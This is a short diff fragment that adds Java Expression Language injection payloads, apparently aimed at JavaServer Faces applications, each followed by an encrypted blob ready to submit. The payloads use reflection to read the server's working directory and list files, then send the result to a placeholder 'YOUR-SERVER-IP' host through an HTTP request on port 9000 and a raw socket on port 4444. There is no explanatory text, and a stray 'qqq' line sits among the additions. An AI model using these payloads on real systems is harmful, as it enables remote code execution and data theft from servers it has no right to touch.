@@ -299,3 +299,12 @@ uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxZIkoWz
 
 payload = encrypt("${facesContext.getExternalContext().setResponseHeader(\"POC\", java.util.Arrays.toString(\"\".getClass().forName(\"java.io.File\").getConstructor(\"\".getClass()).newInstance(\"\".getClass().forName(\"java.lang.System\").getMethod(\"getProperty\", \"\".getClass()).invoke(null, \"user.dir\")).list())))}")
 uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVJOD1h9UnMxbrty1Q8kdF1NAQE/IVtCzU6+L3EAyJD7v68g4UUhVeNcjBOYGqxZf9RbkalWJkapsN77q/Q8flJzTc9d1mQH0SzzXYO8suUZGCtaHm89JO3ZSdTaPFODuk+Kr/RnJKS+iAX0eHzb18Dudz0Tq6fXisfExzhP7xYV5Us8dmpDnbNvqQgZ1+KxkpZ/5xQHZF2xcp9BX0Y6nJmspVQX0rqcEWCUBBGwBs/ePRptLvF82TODEmc5y7gCVhfFkHoNszA62voAzkJnND0Ax98yypMJTMghWK5e7Ivwt7gx0vspKdKkH5/MPKQisD
+
+
+qqq
+
+payload = encrypt("${\"\".getClass().forName(\"java.net.URL\").getConstructor(\"\".getClass()).newInstance(\"http://YOUR-SERVER-IP:9000/?data=\"+\"\".getClass().forName(\"java.lang.System\").getMethod(\"getProperty\", \"\".getClass()).invoke(null, \"user.dir\")).openStream()}")
+sVElCvCKCBaHjKKuVSyfMxoODmSSVScmg9P3b9aDezJ2HOW3hwifihvUlWVwq3wOGsx9CBmbufLUV27KM8P1AdeZQLxEx3fngPyQiDLCwZ7M61uais+hEioVxjYVD/98aonmLgeHSLRNjbsUKD9wR5j2A+F1v1ysLNyYgpnCdSbVNlWtLKL8TltYFry4ZvnGXTL8nJPHv9/WGal0pKQ+j5GVeV8PN/l9NnO0gG4VCSixQdYv39Zr4Oej23hyXYeSW0Gc+jlhQte8rLqPU8UssDh7RkOlUf2ooc2P8gWLaoF1yPohUF9a4yqsLdwAOroM
+
+payload = encrypt("${\"\".getClass().forName(\"java.net.Socket\").getConstructor(\"\".getClass(), Integer.TYPE).newInstance(\"YOUR-SERVER-IP\", 4444).getOutputStream().write(\"File Names: \".getBytes())}")
+sVElCvCKCBaHjKKuVSyfMxoODmSSVScmg9P3b9aDezKj4GfMxJ9u+3GLGqCk3UZ9ZwbaDnt/BhPvadxzEpulkJ8YA473o0vZtG9DCF6+olV7UYHdmR4mN2SoXAXT1ZfSjAyIfpljjFkBqGNlioOBXWLbAwLnYTl5/BPnHZMEsRjksN22uSf9/8HpP4HzXPPae2LS08pLu/vBD4iXniJuWl+mqmIqkp52sfsmIOecAIw=
